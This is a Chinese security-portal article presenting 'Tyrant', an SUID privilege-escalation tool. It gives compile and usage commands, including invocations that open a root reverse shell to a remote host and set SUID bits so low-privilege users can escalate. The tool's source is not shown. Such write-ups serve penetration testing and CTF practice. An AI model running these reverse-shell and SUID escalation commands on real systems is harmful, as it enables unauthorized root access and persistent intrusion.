---
title: Tyrant(暴君) SUID二进制文件权限提升工具
url: https://www.freebuf.com/sectool/420749.html
source: FreeBuf网络安全行业门户
date: 2025-01-25
fetch_date: 2025-10-06T20:10:10.875860
---

# Tyrant(暴君) SUID二进制文件权限提升工具

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Tyrant(暴君) SUID二进制文件权限提升工具

* ![]()
* 关注

* [工具](https://www.freebuf.com/articles/sectool)

Tyrant(暴君) SUID二进制文件权限提升工具

2025-01-24 12:49:30

所属地 福建省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# Tyrant

Tyrant 是一个 SUID 二进制特权升级工具，权限提升或进行横向移动。

## 用法

使用以下命令编译源代码：

```
$ gcc tyrant.c -o tyrant
```

要显示帮助信息，请使用：

```
$ ./tyrant -h
```

![image.png](https://image.3001.net/images/20250123/1737647364_679265045a7ff7376c7b8.png!small)

## 获取 UID

只需在没有任何参数的情况下运行该工具，即可列出当前用户的 UID 及其他用户详细信息：

```
$ ./tyrant
```

![image-2.png](https://image.3001.net/images/20250123/1737647371_6792650b9dd66f9e05f87.png!small)

## 指定 UID 进行反向 Shell：根权限

\*\*注意：\*\*如果你尝试以低权限用户身份启动反向 Shell，将会失败。你必须结合 Tyrant 利用其他漏洞。

要以根权限启动反向 Shell，请执行：

```
# ./tyrant -uid 0 -rhost 192.168.176.129 -rport 443
```

![image-3.png](https://image.3001.net/images/20250123/1737647400_67926528e0897aa8b6c1c.png!small)

执行后，Tyrant 将自动设置 SUID 位，允许低权限用户执行根权限升级操作。例如：

```
$ ./tyrant -uid 0 -rhost 192.168.176.129 -rport 443
```

![image-4.png](https://image.3001.net/images/20250123/1737647411_67926533ad70b983c5ca9.png!small)

![image-5.png](https://image.3001.net/images/20250123/1737647415_679265372efeddb72e76a.png!small)

## 指定其他 UID

你还可以通过指定另一个 UID 切换到不同的用户：

```
# ./tyrant -uid 33 -rhost 192.168.176.129 -rport 443
```

![image-6.png](https://image.3001.net/images/20250123/1737647442_679265525e4a3db42cdcb.png!small)

# 黑客 # CTF

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

用法

获取 UID

指定 UID 进行反向 Shell：根权限

指定其他 UID

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)